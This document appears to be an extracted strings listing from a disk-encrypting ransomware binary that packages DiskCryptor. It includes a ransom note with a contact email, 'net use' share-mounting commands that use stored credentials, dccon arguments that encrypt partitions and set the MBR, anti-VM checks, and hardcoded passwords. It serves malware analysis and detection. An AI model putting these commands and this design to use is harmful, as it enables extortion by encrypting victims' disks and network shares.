+	.rsrc:4B6AD0  dc_get_boot_disk
+	.rsrc:4B6AE1  dc_get_bsod
+	.rsrc:4B6AED  dc_get_cipher_name
+	.rsrc:4B6B00  dc_get_device_status
+	.rsrc:4B6B15  dc_get_drive_info
+	.rsrc:4B6B27  dc_get_hw_name
+	.rsrc:4B6B36  dc_get_mbr_config
+	.rsrc:4B6B48  dc_get_version
+	.rsrc:4B6B57  dc_install_driver
+	.rsrc:4B6B69  dc_is_driver_installed
+	.rsrc:4B6B80  dc_is_driver_works
+	.rsrc:4B6B93  dc_is_old_runned
+	.rsrc:4B6BA4  dc_load_config
+	.rsrc:4B6BB3  dc_make_iso
+	.rsrc:4B6BBF  dc_make_pxe
+	.rsrc:4B6BCB  dc_mbr_config_by_partition
+	.rsrc:4B6BE6  dc_mount_all
+	.rsrc:4B6BF3  dc_mount_volume
+	.rsrc:4B6C03  dc_next_volume
+	.rsrc:4B6C12  dc_open_device
+	.rsrc:4B6C21  dc_remove_driver
+	.rsrc:4B6C32  dc_restore_header
+	.rsrc:4B6C44  dc_save_config
+	.rsrc:4B6C53  dc_set_boot
+	.rsrc:4B6C5F  dc_set_mbr
+	.rsrc:4B6C6A  dc_set_mbr_config
+	.rsrc:4B6C7C  dc_start_decrypt
+	.rsrc:4B6C8D  dc_start_encrypt
+	.rsrc:4B6C9E  dc_start_format
+	.rsrc:4B6CAE  dc_start_re_encrypt
+	.rsrc:4B6CC2  dc_sync_enc_state
+	.rsrc:4B6CD4  dc_unmount_all
+	.rsrc:4B6CE3  dc_unmount_volume
+	.rsrc:4B6CF5  dc_unset_mbr
+	.rsrc:4B6D02  dc_update_boot
+	.rsrc:4B6D11  dc_update_driver
+	.rsrc:4B6D22  enable_privilege
+	.rsrc:4B6D33  is_admin
+	.rsrc:4B6D3C  is_win_vista
+	.rsrc:4B6D49  is_wow64
+	.rsrc:4B6D52  load_file
+	.rsrc:4B6D5C  rnd_init
+	.rsrc:4B6D65  rnd_reseed_now
+	.rsrc:4B6D74  save_file
+	.rsrc:4B6D7E  secure_alloc
+	.rsrc:4B6D8B  secure_free
+	.rsrc:4B7143  -64OS
+	.rsrc:4B7164  NKeb
+	.rsrc:4B75EA  no active partition found
+	.rsrc:4B7629  disk read error
+	.rsrc:4B7645  invalid boot sector
+	.rsrc:4B804C  PAMSu9
+	.rsrc:4BA4BC  MBCD
+	.rsrc:4BA6E2  You are Hacked !!!! Your H.D.D Encrypted , Contact Us For Decryption Key (w889901665@yandex.com) YOURID: 123139
+	.rsrc:4BA762  password incorrect
+	.rsrc:4BAA30  partition unbootable
+	.rsrc:4BAA48  I/O Error
+	.rsrc:4BAA54  this disk is unbootable
+	.rsrc:4BAA70  active partition not found
+	.rsrc:4BAA8C  Not enough memory to mount all partitions
+	.rsrc:4BAAB8  boot disk not found
+	.rsrc:4BAAD0  bootable partition not mounted
+	.rsrc:4BAAF0  disk_id equal partition not found
+	.rsrc:4BAB14  partitions not found
+	.rsrc:4BAB2C  disks not found
+	.rsrc:4BE054  MBCD
+	.rsrc:4BE27A  You are Hacked !!!! Your H.D.D Encrypted , Contact Us For Decryption Key (w889901665@yandex.com) YOURID: 123139
+	.rsrc:4BE2FA  password incorrect
+	.rsrc:4BE5C8  partition unbootable
+	.rsrc:4BE5E0  I/O Error
+	.rsrc:4BE5EC  this disk is unbootable
+	.rsrc:4BE608  active partition not found
+	.rsrc:4BE624  Not enough memory to mount all partitions
+	.rsrc:4BE650  boot disk not found
+	.rsrc:4BE668  bootable partition not mounted
+	.rsrc:4BE688  disk_id equal partition not found
+	.rsrc:4BE6AC  partitions not found
+	.rsrc:4BE6C4  disks not found
+	.rsrc:4BE6E9  D7q/;M
+	.rsrc:4BE77E  +Yo,
+	.rsrc:4BE7E6  &\8!
+	.rsrc:4BE84C  * qW
+	.rsrc:4BE870  LwH'
+	.rsrc:4BE943  L*~e
+	.rsrc:4BEAF6  PAMS
+	.rsrc:4BED72  SVWj
+	.rsrc:4BEE09  KNN3
+	.rsrc:4BEF22  YY[]
+	.rsrc:4BEFA6   t"9\$
+	.rsrc:4BF015  L$,j
+	.rsrc:4BF038  D$$P
+	.rsrc:4BF137  t$zY
+	.rsrc:4BF408  Ht[H
+	.rsrc:4BF5BA  DCRPt
+	.rsrc:4BF5DA  Cj@Y3
+	.rsrc:4BF605  SVW3
+	.rsrc:4BF6E9  @0_^[
+	.rsrc:4BF81E  @ SVW3
+
+	.rsrc:4F2320  permission denied
+	.rsrc:4F2334  file exists
+	.rsrc:4F2340  no such device
+	.rsrc:4F2350  filename too long
+	.rsrc:4F2364  device or resource busy
+	.rsrc:4F237C  io error
+	.rsrc:4F2388  directory not empty
+	.rsrc:4F239C  invalid argument
+	.rsrc:4F23B0  no space on device
+	.rsrc:4F23C4  no such file or directory
+	.rsrc:4F23E0  function not supported
+	.rsrc:4F23F8  no lock available
+	.rsrc:4F240C  not enough memory
+	.rsrc:4F2420  resource unavailable try again
+	.rsrc:4F2440  cross device link
+	.rsrc:4F2454  operation canceled
+	.rsrc:4F2468  too many files open
+	.rsrc:4F247C  permission_denied
+	.rsrc:4F2490  address_in_use
+	.rsrc:4F24A0  address_not_available
+	.rsrc:4F24B8  address_family_not_supported
+	.rsrc:4F24D8  connection_already_in_progress
+	.rsrc:4F24F8  bad_file_descriptor
+	.rsrc:4F250C  connection_aborted
+	.rsrc:4F2520  connection_refused
+	.rsrc:4F2534  connection_reset
+	.rsrc:4F2548  destination_address_required
+	.rsrc:4F2568  bad_address
+	.rsrc:4F2574  host_unreachable
+	.rsrc:4F2588  operation_in_progress
+	.rsrc:4F25A0  interrupted
+	.rsrc:4F25AC  invalid_argument
+	.rsrc:4F25C0  already_connected
+	.rsrc:4F25D4  too_many_files_open
+	.rsrc:4F25E8  message_size
+	.rsrc:4F25F8  filename_too_long
+	.rsrc:4F260C  network_down
+	.rsrc:4F261C  network_reset
+	.rsrc:4F262C  network_unreachable
+	.rsrc:4F2640  no_buffer_space
+	.rsrc:4F2650  no_protocol_option
+	.rsrc:4F2664  not_connected
+	.rsrc:4F2674  not_a_socket
+	.rsrc:4F2684  operation_not_supported
+	.rsrc:4F269C  protocol_not_supported
+	.rsrc:4F26B4  wrong_protocol_type
+	.rsrc:4F26C8  timed_out
+	.rsrc:4F26D4  operation_would_block
+	.rsrc:4F26EC  address family not supported
+	.rsrc:4F270C  address in use
+	.rsrc:4F271C  address not available
+	.rsrc:4F2734  already connected
+	.rsrc:4F2748  argument list too long
+	.rsrc:4F2760  argument out of domain
+	.rsrc:4F2778  bad address
+	.rsrc:4F2784  bad file descriptor
+	.rsrc:4F2798  bad message
+	.rsrc:4F27A4  broken pipe
+	.rsrc:4F27B0  connection aborted
+	.rsrc:4F27C4  connection already in progress
+	.rsrc:4F27E4  connection refused
+	.rsrc:4F27F8  connection reset
+	.rsrc:4F280C  destination address required
+	.rsrc:4F282C  executable format error
+	.rsrc:4F2844  file too large
+	.rsrc:4F2854  host unreachable
+	.rsrc:4F2868  identifier removed
+	.rsrc:4F287C  illegal byte sequence
+	.rsrc:4F2894  inappropriate io control operation
+	.rsrc:4F28B8  invalid seek
+	.rsrc:4F28C8  is a directory
+	.rsrc:4F28D8  message size
+	.rsrc:4F28E8  network down
+	.rsrc:4F28F8  network reset
+	.rsrc:4F2908  network unreachable
+	.rsrc:4F291C  no buffer space
+	.rsrc:4F292C  no child process
+	.rsrc:4F2940  no link
+	.rsrc:4F2948  no message available
+	.rsrc:4F2960  no message
+	.rsrc:4F296C  no protocol option
+	.rsrc:4F2980  no stream resources
+	.rsrc:4F2994  no such device or address
+	.rsrc:4F29B0  no such process
+	.rsrc:4F29C0  not a directory
+	.rsrc:4F29D0  not a socket
+	.rsrc:4F29E0  not a stream
+	.rsrc:4F29F0  not connected
+	.rsrc:4F2A00  not supported
+	.rsrc:4F2A10  operation in progress
+	.rsrc:4F2A28  operation not permitted
+	.rsrc:4F2A40  operation not supported
+	.rsrc:4F2A58  operation would block
+	.rsrc:4F2A70  owner dead
+	.rsrc:4F2A7C  protocol error
+	.rsrc:4F2A8C  protocol not supported
+	.rsrc:4F2AA4  read only file system
+	.rsrc:4F2ABC  resource deadlock would occur
+	.rsrc:4F2ADC  result out of range
+	.rsrc:4F2AF0  state not recoverable
+	.rsrc:4F2B08  stream timeout
+	.rsrc:4F2B18  text file busy
+	.rsrc:4F2B28  timed out
+	.rsrc:4F2B34  too many files open in system
+	.rsrc:4F2B54  too many links
+	.rsrc:4F2B64  too many symbolic link levels
+	.rsrc:4F2B84  value too large
+	.rsrc:4F2B94  wrong protocol type
+	.rsrc:4F2C24  bad allocation
+	.rsrc:4F2CA8  COMSPEC
+	.rsrc:4F2CB0  cmd.exe
+	.rsrc:4F2CB8   /c 
+	.rsrc:4F2CC0  PATH
+	.rsrc:4F2CE4  CorExitProcess
+	.rsrc:4F2D00  Unknown exception
+	.rsrc:4F2DAC  log10
+	.rsrc:4F2DBC  asin
+	.rsrc:4F2DC4  acos
+	.rsrc:4F2DCC  exp10
+	.rsrc:4F2DD4  atan
+	.rsrc:4F2DDC  ceil
+	.rsrc:4F2DE4  floor
+	.rsrc:4F2DEC  modf
+	.rsrc:4F2E00  sqrt
+	.rsrc:4F3864  (null)
+	.rsrc:4F38A1  ( 8PX
+	.rsrc:4F38A9  700WP
+	.rsrc:4F38B9  `h````
+	.rsrc:4F38C1  xpxxxx
+	.rsrc:4F38F8  FlsAlloc
+	.rsrc:4F3904  FlsFree
+	.rsrc:4F390C  FlsGetValue
+	.rsrc:4F3918  FlsSetValue
+	.rsrc:4F3924  InitializeCriticalSectionEx
+	.rsrc:4F3940  CreateSemaphoreExW
+	.rsrc:4F3954  SetThreadStackGuarantee
+	.rsrc:4F396C  CreateThreadpoolTimer
+	.rsrc:4F3984  SetThreadpoolTimer
+	.rsrc:4F3998  WaitForThreadpoolTimerCallbacks
+	.rsrc:4F39B8  CloseThreadpoolTimer
+	.rsrc:4F39D0  CreateThreadpoolWait
+	.rsrc:4F39E8  SetThreadpoolWait
+	.rsrc:4F39FC  CloseThreadpoolWait
+	.rsrc:4F3A10  FlushProcessWriteBuffers
+	.rsrc:4F3A2C  FreeLibraryWhenCallbackReturns
+	.rsrc:4F3A4C  GetCurrentProcessorNumber
+	.rsrc:4F3A68  GetLogicalProcessorInformation
+	.rsrc:4F3A88  CreateSymbolicLinkW
+	.rsrc:4F3A9C  SetDefaultDllDirectories
+	.rsrc:4F3AB8  EnumSystemLocalesEx
+	.rsrc:4F3ACC  CompareStringEx
+	.rsrc:4F3ADC  GetDateFormatEx
+	.rsrc:4F3AEC  GetLocaleInfoEx
+	.rsrc:4F3AFC  GetTimeFormatEx
+	.rsrc:4F3B0C  GetUserDefaultLocaleName
+	.rsrc:4F3B28  IsValidLocaleName
+	.rsrc:4F3B3C  LCMapStringEx
+	.rsrc:4F3B4C  GetCurrentPackageId
+	.rsrc:4F3C5C  Sunday
+	.rsrc:4F3C64  Monday
+	.rsrc:4F3C6C  Tuesday
+	.rsrc:4F3C74  Wednesday
+	.rsrc:4F3C80  Thursday
+	.rsrc:4F3C8C  Friday
+	.rsrc:4F3C94  Saturday
+	.rsrc:4F3CD0  January
+	.rsrc:4F3CD8  February
+	.rsrc:4F3CE4  March
+	.rsrc:4F3CEC  April
+	.rsrc:4F3CF4  June
+	.rsrc:4F3CFC  July
+	.rsrc:4F3D04  August
+	.rsrc:4F3D0C  September
+	.rsrc:4F3D18  October
+	.rsrc:4F3D20  November
+	.rsrc:4F3D2C  December
+	.rsrc:4F3D40  MM/dd/yy
+	.rsrc:4F3D4C  dddd, MMMM dd, yyyy
+	.rsrc:4F3D60  HH:mm:ss
+	.rsrc:4F3FBF   !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+	.rsrc:4F4068  bad exception
+	.rsrc:4F407C  sinh
+	.rsrc:4F4084  cosh
+	.rsrc:4F408C  tanh
+	.rsrc:4F4094  atan2
+	.rsrc:4F409C  fabs
+	.rsrc:4F40A4  ldexp
+	.rsrc:4F40AC  _cabs
+	.rsrc:4F40B4  _hypot
+	.rsrc:4F40BC  fmod
+	.rsrc:4F40C4  frexp
+	.rsrc:4F40D8  _logb
+	.rsrc:4F40E0  _nextafter
+	.rsrc:4F4104  MessageBoxW
+	.rsrc:4F4110  GetActiveWindow
+	.rsrc:4F4120  GetLastActivePopup
+	.rsrc:4F4134  GetUserObjectInformationW
+	.rsrc:4F4150  GetProcessWindowStation
+	.rsrc:4F6368  __based(
+	.rsrc:4F6374  __cdecl
+	.rsrc:4F637C  __pascal
+	.rsrc:4F6388  __stdcall
+	.rsrc:4F6394  __thiscall
+	.rsrc:4F63A0  __fastcall
+	.rsrc:4F63AC  __clrcall
+	.rsrc:4F63B8  __eabi
+	.rsrc:4F63C0  __ptr64
+	.rsrc:4F63C8  __restrict
+	.rsrc:4F63D4  __unaligned
+	.rsrc:4F63E0  restrict(
+	.rsrc:4F63EC   new
+	.rsrc:4F63F4   delete
+	.rsrc:4F6418  operator
+	.rsrc:4F64A0  `vftable'
+	.rsrc:4F64AC  `vbtable'
+	.rsrc:4F64B8  `vcall'
+	.rsrc:4F64C0  `typeof'
+	.rsrc:4F64CC  `local static guard'
+	.rsrc:4F64E4  `string'
+	.rsrc:4F64F0  `vbase destructor'
+	.rsrc:4F6504  `vector deleting destructor'
+	.rsrc:4F6524  `default constructor closure'
+	.rsrc:4F6544  `scalar deleting destructor'
+	.rsrc:4F6564  `vector constructor iterator'
+	.rsrc:4F6584  `vector destructor iterator'
+	.rsrc:4F65A4  `vector vbase constructor iterator'
+	.rsrc:4F65C8  `virtual displacement map'
+	.rsrc:4F65E4  `eh vector constructor iterator'
+	.rsrc:4F6608  `eh vector destructor iterator'
+	.rsrc:4F6628  `eh vector vbase constructor iterator'
+	.rsrc:4F6650  `copy constructor closure'
+	.rsrc:4F666C  `udt returning'
+	.rsrc:4F6680  `RTTI
+	.rsrc:4F6688  `local vftable'
+	.rsrc:4F6698  `local vftable constructor closure'
+	.rsrc:4F66BC   new[]
+	.rsrc:4F66C4   delete[]
+	.rsrc:4F66D0  `omni callsig'
+	.rsrc:4F66E0  `placement delete closure'
+	.rsrc:4F66FC  `placement delete[] closure'
+	.rsrc:4F671C  `managed vector constructor iterator'
+	.rsrc:4F6744  `managed vector destructor iterator'
+	.rsrc:4F676C  `eh vector copy constructor iterator'
+	.rsrc:4F6794  `eh vector vbase copy constructor iterator'
+	.rsrc:4F67C0  `dynamic initializer for '
+	.rsrc:4F67DC  `dynamic atexit destructor for '
+	.rsrc:4F6800  `vector copy constructor iterator'
+	.rsrc:4F6824  `vector vbase copy constructor iterator'
+	.rsrc:4F6850  `managed vector copy constructor iterator'
+	.rsrc:4F687C  `local static thread guard'
+	.rsrc:4F6898   Type Descriptor'
+	.rsrc:4F68AC   Base Class Descriptor at (
+	.rsrc:4F68C8   Base Class Array'
+	.rsrc:4F68DC   Class Hierarchy Descriptor'
+	.rsrc:4F68FC   Complete Object Locator'
+	.rsrc:4F693D  ('8PW
+	.rsrc:4F6946  700PP
+	.rsrc:4F6958  `h`hhh
+	.rsrc:4F6961  xppwpp
+	.rsrc:4F6F20   !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+	.rsrc:4F70A0   !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+	.rsrc:4F7188  e+000
+	.rsrc:4F71A0  1#SNAN
+	.rsrc:4F71A8  1#IND
+	.rsrc:4F71B0  1#INF
+	.rsrc:4F71B8  1#QNAN
+	.rsrc:4F71C0  generic
+	.rsrc:4F71C8  unknown error
+	.rsrc:4F71D8  iostream
+	.rsrc:4F71E4  iostream stream error
+	.rsrc:4F71FC  system
+	.rsrc:4F7204  )#rpxZ@(q2e=CW&D
+	.rsrc:4F7218  #####
+	.rsrc:4F7220  invalid string position
+	.rsrc:4F7238  string too long
+	.rsrc:4F724C  Deep Freeze
+	.rsrc:4F7258  reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /reg:64
+	.rsrc:4F72B8  reg query HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\
+	.rsrc:4F72F4  VBoxMo
+	.rsrc:4F72FC  GetModuleHandleA
+	.rsrc:4F7310  Kernel32.dll
+	.rsrc:4F7320  GetModuleHandleW
+	.rsrc:4F7334  GetCurrentProcess
+	.rsrc:4F7348  VirtualFreeEx
+	.rsrc:4F7358  VirtualAlloc
+	.rsrc:4F7368  IsBadReadPtr
+	.rsrc:4F7378  FreeLibrary
+	.rsrc:4F7384  SetLastError
+	.rsrc:4F7394  VirtualFree
+	.rsrc:4F73A0  VirtualProtect
+	.rsrc:4F73B0  MessageBoxA
+	.rsrc:4F73BC  User32.dll
+	.rsrc:4F73C8  Sleep
+	.rsrc:4F73D0  CreateFileA
+	.rsrc:4F73DC  CreateFileW
+	.rsrc:4F73E8  CloseHandle
+	.rsrc:4F73F4  WriteFile
+	.rsrc:4F7400  ReadFile
+	.rsrc:4F740C  SetFilePointer
+	.rsrc:4F741C  GetFileSize
+	.rsrc:4F7428  GetVersionExW
+	.rsrc:4F7438  CreateEventW
+	.rsrc:4F7448  CreateSemaphoreW
+	.rsrc:4F745C  ReleaseSemaphore
+	.rsrc:4F7470  InitializeCriticalSection
+	.rsrc:4F748C  K32GetModuleBaseNameW
+	.rsrc:4F74A4  GetProcessHeap
+	.rsrc:4F74B4  HeapFree
+	.rsrc:4F74C0  HeapAlloc
+	.rsrc:4F74CC  HeapReAlloc
+	.rsrc:4F74D8  GetModuleBaseName
+	.rsrc:4F74EC  Psapi.dll
+	
+	.rsrc:5160C8  <?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+	.rsrc:516101  <assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+	.rsrc:51614C    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+	.rsrc:516184      <security>
+	.rsrc:516194        <requestedPrivileges>
+	.rsrc:5161B1          <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+	.rsrc:5161F9        </requestedPrivileges>
+	.rsrc:516217      </security>
+	.rsrc:516228    </trustInfo>
+	.rsrc:516238  </assembly>
+
+	.rsrc:63A260  C:\DC22\log_file.txt
+	.rsrc:63A27C  0123456789abcdef
+	.rsrc:63A2E8  CryptAcquireContext failed: %d
+	.rsrc:63A308  CryptCreateHash failed: %d
+	.rsrc:63A324  CryptHashData failed: %d
+	.rsrc:63A340  CryptGetHashParam failed: %d
+	.rsrc:63A360  cmd.exe /c net use m: 
+	.rsrc:63A378   /USER:
+	.rsrc:63A384  " /PERSISTENT:YES
+	.rsrc:63A398  mount:make request to mounting share drive:
+	.rsrc:63A3C4  mount:successfully mounting share drive...
+	.rsrc:63A3F0  mount:mounting failed..
+	.rsrc:63A408  net use m: /delete
+	.rsrc:63A41C  mount:OS is win2003 or lower...
+	.rsrc:63A43C  mount:mounting share drive...
+	.rsrc:63A45C  C:\DC22\netpass.txt
+	.rsrc:63A470  mount:netpass.txt file not accessible..
+	.rsrc:63A498  Domain:target=
+	.rsrc:63A4B0  C:\DC22\netuse.txt
+	.rsrc:63A4C4  mount:netuse.txt file not accessible..
+	.rsrc:63A4F0  mount:finding share drive...
+	.rsrc:63A510  mount:share drive not found ...
+	.rsrc:63A530  mount:exit Mount...
+	.rsrc:63A5CC  mount:Enumerating mount drive to start encryption on them...
+	.rsrc:63A610  open
+	.rsrc:63A618  mount:start...
+	.rsrc:63A628  pass:
+	.rsrc:63A630  mount:start encrypting share drives...
+	.rsrc:63A658  string too long
+	.rsrc:63A668  invalid string position
+	.rsrc:63A680  bad cast
+	.rsrc:63A7B0  RSDS
+	.rsrc:63A7C8  E:\localsave\trunk\CRP\CRP\Release\Mount.pdb
+	
+Interesting UNICODE Strings:
+	.rdata:422F1E  BR6008
+	.rdata:422F2E  - not enough space for arguments
+	.rdata:422F78  R6009
+	.rdata:422F86  - not enough space for environment
+	.rdata:422FD0  R6010
+	.rdata:422FDE  - abort() has been called
+	.rdata:423018  R6016
+	.rdata:423026  - not enough space for thread data
+	.rdata:423070  R6017
+	.rdata:42307E  - unexpected multithread lock error
+	.rdata:4230D0  R6018
+	.rdata:4230DE  - unexpected heap error
+	.rdata:423118  R6019
+	.rdata:423126  - unable to open console device
+	.rdata:423170  R6024
+	.rdata:42317E  - not enough space for _onexit/atexit table
+	.rdata:4231E0  R6025
+	.rdata:4231EE  - pure virtual function call
+	.rdata:423230  R6026
+	.rdata:42323E  - not enough space for stdio initialization
+	.rdata:4232A0  R6027
+	.rdata:4232AE  - not enough space for lowio initialization
+	.rdata:423310  R6028
+	.rdata:42331E  - unable to initialize heap
+	.rdata:42335C  R6030
+	.rdata:42336A  - CRT not initialized
+	.rdata:4233A0  R6031
+	.rdata:4233AE  - Attempt to initialize the CRT more than once.
+	.rdata:42340E  This indicates a bug in your application.
+	.rdata:423468  R6032
+	.rdata:423476  - not enough space for locale information
+	.rdata:4234D0  R6033
+	.rdata:4234DE  - Attempt to use MSIL code from this assembly during native code initialization
+	.rdata:42357E  This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.
+	.rdata:4236C0  R6034
+	.rdata:4236CE  - inconsistent onexit begin-end variables
+	.rdata:423728  DOMAIN error
+	.rdata:423748  SING error
+	.rdata:423764  TLOSS error
+	.rdata:423788  runtime error 
+	.rdata:42385E  BR6002
+	.rdata:42386E  - floating point support not loaded
+	.rdata:4238BC  Runtime Error!
+	.rdata:4238DC  Program: 
+	.rdata:4238F0  <program name unknown>
+	.rdata:423930  Microsoft Visual C++ Runtime Library
+	.rdata:423AA6  ALC_ALL
+	.rdata:423AB8  LC_COLLATE
+	.rdata:423AD0  LC_CTYPE
+	.rdata:423AE4  LC_MONETARY
+	.rdata:423AFC  LC_NUMERIC
+	.rdata:423B14  LC_TIME
+	.rdata:423BEA  Eccs
+	.rdata:423BF4  UTF-8
+	.rdata:423C00  UTF-16LE
+	.rdata:423C14  UNICODE
+	.rdata:423D88  Sunday
+	.rdata:423D98  Monday
+	.rdata:423DA8  Tuesday
+	.rdata:423DB8  Wednesday
+	.rdata:423DCC  Thursday
+	.rdata:423DE0  Friday
+	.rdata:423DF0  Saturday
+	.rdata:423E64  January
+	.rdata:423E74  February
+	.rdata:423E88  Marc
+	.rdata:423E94  April
+	.rdata:423EA0  June
+	.rdata:423EAC  July
+	.rdata:423EB8  August
+	.rdata:423EC8  September
+	.rdata:423EDC  October
+	.rdata:423EEC  November
+	.rdata:423F00  December
+	.rdata:423F24  MM/dd/yy
+	.rdata:423F38  dddd, MMMM dd, yyyy
+	.rdata:423F60  HH:mm:ss
+	.rdata:424044  (null)
+	.rdata:424174  USER32.DLL
+
+	.rdata:425744  CONOUT$
+	.rdata:42584E  .dcrypt.sys
+	.rdata:425868  %s\drivers\%s
+	.rdata:4258FC  32dcrypt.sys
+	.rdata:425918  32dcrypt.exe
+	.rdata:425934  dcrypt.exe
+	.rdata:42594C  32dcinst.exe
+	.rdata:425968  dcinst.exe
+	.rdata:425980  32dccon.exe
+	.rdata:425998  dccon.exe
+	.rdata:4259AC  32dcapi.dll
+	.rdata:4259C4  dcapi.dll
+	.rdata:4259D8  Mount.exe
+	.rdata:4259EC  32netpass.exe
+	.rdata:425A08  netpass.exe
+	.rdata:425A20  64dcrypt.sys
+	.rdata:425A3C  64dcrypt.exe
+	.rdata:425A58  64dcinst.exe
+	.rdata:425A74  64dccon.exe
+	.rdata:425A8C  64dcapi.dll
+	.rdata:425AA4  64netpass.exe
+	.rdata:425ADC  \dcinst.exe
+	.rdata:425B0C  -setup
+	.rdata:425B1C  open
+	.rdata:425B6C  SeShutdownPrivilege
+	.rdata:425BB0  C:\DC22
+	.rdata:425D54  My Sample Service
+	.rdata:425D92  ..exe
+	.rdata:425DA0  .EXE
+	.rdata:425DB0  DefragmentService
+	.rdata:4260D0  123456
+	.rdata:4260E0  mythbusters
+	.rdata:426126  EC:\DC22\Mount.exe
+	.rdata:42614C  \dccon.exe
+	.rdata:426164  -boot -setmbr hd0
+	.rdata:4261A8  -encrypt
+	.rdata:4261BA  pt1 -p 
+	.rdata:4261CC  -encrypt pt0 -p 
+	.rdata:4261F0  -encrypt pt2 -p 
+	.rdata:426214  -encrypt pt3 -p 
+	.rdata:426238  -encrypt pt4 -p 
+	.rdata:42625C  -encrypt pt5 -p 
+	.rdata:426280  -encrypt pt6 -p 
+	.rdata:4262A4  -encrypt pt7 -p 
+	.rdata:4262C8  -encrypt pt8 -p 
+	.rdata:4262EC  -encrypt pt9 -p 
+	.rsrc:42D402  32DC
+	.rsrc:42D40C  YPT.SYS
+	.rsrc:42D41C  32DCRYPT.EXE
+	.rsrc:42D436  32DCINST.EXE
+	.rsrc:42D450  32DCCON.EXE
+	.rsrc:42D468  32DCAPI.DLL
+	.rsrc:42D480  32NETPASS.EXE
+	.rsrc:42D49C  64DCRYPT.SYS
+	.rsrc:42D4B6  64DCRYPT.EXE
+	.rsrc:42D4D0  64DCINST.EXE
+	.rsrc:42D4EA  64DCCON.EXE
+	.rsrc:42D502  64DCAPI.DLL
+	.rsrc:42D51A  64NETPASS.EXE
+	.rsrc:42D536  MOUNT.EXE
+	
+	.rsrc:4547B4  config
+	.rsrc:4547C4  Flags
+	.rsrc:4547D0  \Device\dcrypt
+	.rsrc:4547F0  \DosDevices\dcrypt
+	.rsrc:454818  dump_
+	.rsrc:454824  hiber_
+	.rsrc:454834  %s\$dcsys$
+	.rsrc:45484C  $dcsys$
+	.rsrc:45485C  \Device\CdRom
+	.rsrc:454878  %s\$DC_TRIM_%x$
+	.rsrc:454898  $dcsys$_fail_%x
+	.rsrc:4548B8  NTFS
+	.rsrc:4548CC  FAT32
+	.rsrc:4548D8  exFAT
+	.rsrc:455DB6  VS_VERSION_INFO
+	.rsrc:455E12  StringFileInfo
+	.rsrc:455E36  000904b0
+	.rsrc:455E4E  FileDescription
+	.rsrc:455E70  DiskCryptor driver
+	.rsrc:455E9E  FileVersion
+	.rsrc:455EB8  1.1.846.118
+	.rsrc:455ED6  LegalCopyright
+	.rsrc:455EF4  http://diskcryptor.net/
+	.rsrc:455F2A  OriginalFilename
+	.rsrc:455F4C  dcrypt.sys
+	.rsrc:455F6A  ProductName
+	.rsrc:455F84  DiskCryptor
+	.rsrc:455FA2  ProductVersion
+	.rsrc:455FCE  VarFileInfo
+	.rsrc:455FEE  Translation
+	.rsrc:457BAB  <<<Obsolete>>
+
+	.rsrc:46C6D8   Correct
+	.rsrc:46C6EC   Keyfiles list is empty
+	.rsrc:46C71C   Confirm is empty
+	.rsrc:46C740   The password was not correctly confirmed
+	.rsrc:46C794   Pass is empty
+	.rsrc:46C7B8   Used suppressed symbols on this layout
+	.rsrc:46C808  Bootloader image for PXE network booting
+	.rsrc:46C85C  ISO bootloader image
+	.rsrc:46C888  Bootable partition (USB-Stick, etc)
+	.rsrc:46C8D0  HDD master boot record
+	.rsrc:46C900  Load Boot Disk MBR
+	.rsrc:46C928  Retry authentication
+	.rsrc:46C954  Exit to BIOS
+	.rsrc:46C970  Boot from active partition
+	.rsrc:46C9A8  Reboot system
+	.rsrc:46C9C4  Halt system
+	.rsrc:46C9DC  Active partition
+	.rsrc:46CA00  Boot disk MBR
+	.rsrc:46CA1C  Specified partition
+	.rsrc:46CA48  First partition with appropriate password
+	.rsrc:46CA9C  First disk MBR
+	.rsrc:46CABC  5 minutes
+	.rsrc:46CAD0  2 minutes
+	.rsrc:46CAE4  50 sec
+	.rsrc:46CAF4  30 sec
+	.rsrc:46CB04  20 sec
+	.rsrc:46CB14  10 sec
+	.rsrc:46CB24  7 sec
+	.rsrc:46CB30  5 sec
+	.rsrc:46CB3C  3 sec
+	.rsrc:46CB48  Disabled
+	.rsrc:46CB60  Display entered password as "*"
+	.rsrc:46CBA0  Hide entered password
+	.rsrc:46CBCC  Embedded bootauth keyfile
+	.rsrc:46CC00  Password request
+	.rsrc:46CC24  Password and bootauth keyfile
+	.rsrc:46CC60  AZERTY
+	.rsrc:46CC70  QWERTZ
+	.rsrc:46CC80  QWERTY
+	.rsrc:46CC90  Gutmann mode
+	.rsrc:46CCB0  US DoD 5220.22-M (8-306. / E, C and E)
+	.rsrc:46CD00  US DoD 5220.22-M (8-306. / E)
+	.rsrc:46CD3C  None
+	.rsrc:46CD48  AES-Twofish-Serpent
+	.rsrc:46CD70  Serpent-AES
+	.rsrc:46CD88  Twofish-Serpent
+	.rsrc:46CDA8  AES-Twofish
+	.rsrc:46CDC0  Serpent
+	.rsrc:46CDD0  Twofish
+	.rsrc:46CDE8  Elapsed:
+	.rsrc:46CDFC  Estimated:
+	.rsrc:46CE14  Speed:
+	.rsrc:46CE24  Done:
+	.rsrc:46CE30  Pkcs5.2 prf
+	.rsrc:46CE48  Encryption mode
+	.rsrc:46CE68  Device
+	.rsrc:46CE78  Symbolic Link
+	.rsrc:46CE94  Speed
+	.rsrc:46CEA0  Mode
+	.rsrc:46CEAC  Cipher
+	.rsrc:46CEBC  Disk ID
+	.rsrc:46CECC  Volume 
+	.rsrc:46CEDC  Bootloader
+	.rsrc:46CEF4  Device 
+	.rsrc:46CF08  Status
+	.rsrc:46CF18  Type
+	.rsrc:46CF24  Label
+	.rsrc:46CF30  Size
+	.rsrc:46CF40  Select Folder..
+	.rsrc:46CF68  HardDisk %d
+	.rsrc:46CF80  installed
+	.rsrc:46CF94  none
